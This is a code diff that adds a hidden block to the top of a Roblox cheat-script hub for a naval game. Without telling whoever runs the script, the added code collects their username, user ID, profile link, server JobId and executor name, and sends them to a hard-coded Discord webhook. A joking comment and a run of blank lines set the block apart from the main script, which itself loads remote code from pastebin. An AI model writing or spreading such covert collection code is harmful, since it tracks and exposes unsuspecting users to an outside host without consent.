@@ -1,3 +1,63 @@
+local gameLink = "https://www.roblox.com/games/"..game.PlaceId.."/"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name..""
+gameLink = string.gsub(gameLink, " ", "-")
+ 
+if string.sub(gameLink, -1) == "-" then
+    gameLink = string.sub(gameLink, 1, -2)
+end
+ 
+ 
+-- bro why u here 
+--{https://www.roblox.com/games/]]..game.PlaceId..[[/]] ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name..[[?serverJobId=]]..game.JobId..[[  }--
+local url =
+   "https://discord.com/api/webhooks/1199578687163617290/FJXC6h72f8TiyyDTjB8xi7lkro19fZeYoUB8KoKZjv1xM-pjqIvGoI8wMT_Vx4tmppxO"
+local data = {
+   ["content"] = " ***Executon Logs***",
+   ["embeds"] = {
+       {
+           ["title"] = [[Script Executed in:  ]]   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. [[   
+With:  ]].. identifyexecutor() or [[Unknown]],
+           ["description"] = [[By:
+           Username: ]] ..game.Players.LocalPlayer.Name.. [[   
+           UserID: ]]..game.Players.LocalPlayer.UserId..[[   
+           Profile: https://www.roblox.com/users/]]..game.Players.LocalPlayer.UserId..[[/profile
+ 
+           Game link:  ]]..gameLink..[[
+ 
+            JobId :  ]] ..game.JobId.. [[   
+            Game Id :  ]] ..game.PlaceId.. [[
+ 
+ 
+           Join game:  ```lua
+game:GetService('TeleportService'):TeleportToPlaceInstance(]]..game.PlaceId..[[, ']]..game.JobId..[[')```]],
+           ["type"] = "rich",
+           ["color"] = tonumber(0x3131da),
+           ["image"] = { 
+               ["url"] = ""
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+
+
+
+
+
+
+
+
+
+
+
 local OrionLib = loadstring(game:HttpGet(("https://pastebin.com/raw/F3FTzkFc")))()
 local Window = OrionLib:MakeWindow({Name = "Naval Warfare (2024)", HidePremium = false, SaveConfig = true, ConfigFolder = "Mobile_Hub"})
 
